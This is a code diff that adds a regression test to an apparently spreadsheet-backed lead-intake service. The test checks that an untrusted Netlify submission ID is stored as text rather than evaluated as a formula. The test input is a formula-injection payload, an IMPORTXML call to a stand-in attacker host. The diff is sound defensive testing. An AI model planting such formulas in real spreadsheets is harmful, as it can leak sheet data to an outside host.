@@ -268,6 +268,35 @@ function testNetlifyJwsAndSignedIntake() {
   assert.deepEqual(h.lockState(), { lockDepth: 0, lockReleases: 2 });
 }
 
+function testNetlifySubmissionIdIsFormulaSafe() {
+  const h = makeHarness('На рассмотрении', false);
+  const payload = JSON.parse(makeNetlifyBody());
+  const maliciousId = '=IMPORTXML("https://attacker.example","//a")';
+  payload.payload.id = maliciousId;
+  const rawBody = JSON.stringify(payload);
+  const signature = makeNetlifyJws(rawBody);
+  const rawBodyBase64 = Buffer.from(rawBody, 'utf8').toString('base64');
+
+  const accepted = output(h.context.doPost({
+    postData: {
+      contents: JSON.stringify({
+        token: 'synthetic-test-token',
+        action: 'receiveSignedNetlifyLead',
+        signature,
+        rawBodyBase64
+      })
+    }
+  }));
+
+  assert.equal(accepted.ok, true);
+  assert.equal(h.rows.length, 2);
+  const headers = h.rows[0];
+  const savedId = h.rows[1][headers.indexOf('Netlify Submission ID')];
+  assert.equal(savedId, "'" + maliciousId,
+    'untrusted Netlify submission IDs must be stored as text, not formulas');
+  assert.deepEqual(h.lockState(), { lockDepth: 0, lockReleases: 1 });
+}
+
 function testWorkflow1RequiresRawSignedBodyAndMinimizesTelegram() {
   const webhook = JSON.parse(fs.readFileSync(
     path.join(__dirname, '..', 'mini-crm', 'workflow-1-new-lead.json'), 'utf8'
@@ -820,6 +849,7 @@ function testAllWorkflowExportsAreValidJson() {
 }
 
 testNetlifyJwsAndSignedIntake();
+testNetlifySubmissionIdIsFormulaSafe();
 testSalesEngineAtomicDedupeAndScoreValidation();
 testWorkflow1RequiresRawSignedBodyAndMinimizesTelegram();
 testInternalTokenValidationFailsClosed();
